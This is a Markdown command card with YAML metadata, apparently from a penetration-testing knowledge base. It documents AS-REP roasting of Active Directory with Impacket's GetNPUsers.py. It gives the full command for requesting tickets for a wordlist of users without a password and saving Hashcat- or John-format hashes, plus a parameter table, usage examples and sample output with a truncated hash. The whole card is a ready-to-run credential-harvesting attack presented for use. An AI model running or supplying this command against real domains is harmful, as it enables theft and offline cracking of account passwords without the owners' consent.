---
type: command
executor: bash
data: >-
  GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_WORDLIST.txt -dc-ip
  $_TARGET_IP -request -format hashcat -outputfile asrep_hashes.txt
output: |-
  Impacket v0.10.0 - Copyright 2023 SecureAuth Corporation

  [-] User testuser1 doesn't have UF_DONT_REQUIRE_PREAUTH set
  [*] Getting TGT for testuser2
  $krb5asrep$23$testuser2@EXAMPLE.COM:abcdef1234567890...
  [-] User testuser3 doesn't have UF_DONT_REQUIRE_PREAUTH set
  [+] Saved TGT for testuser2 to asrep_hashes.txt
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - kerberos
  - roasting
verified: true
validated: true
---

# GetNPUsers-AS-REP-Roasting-Brute-Force

## Command

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_WORDLIST.txt -dc-ip $_TARGET_IP -request -format hashcat -outputfile asrep_hashes.txt
```

## Description

Requests AS-REP TGTs for users in a wordlist, outputting Hashcat-formatted hashes for roastable accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -no-pass | Skip password (for roasting) | Yes |
| -usersfile | Path to username list | Yes |
| -dc-ip | Domain controller IP | Yes |
| -request | Request TGT | Yes |
| -format hashcat | Output in Hashcat mode | Yes |
| -outputfile | Save hashes to file | Yes |
| $_DOMAIN | AD domain name | Yes |
| $_TARGET_IP | DC IP | Yes |
| $_USERS_WORDLIST.txt | Username file | Yes |

## Examples

### Basic Usage

```bash
GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10
```

### Advanced Usage

```bash
GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10 -format john
```

John the Ripper format.

## Expected Output

Hashes for valid roastable users only.

## Related

- [[procedures/Brute-Force-AS-REP-Roastable-Users-with-GetNPUsers]]
- [[tools/Impacket]]
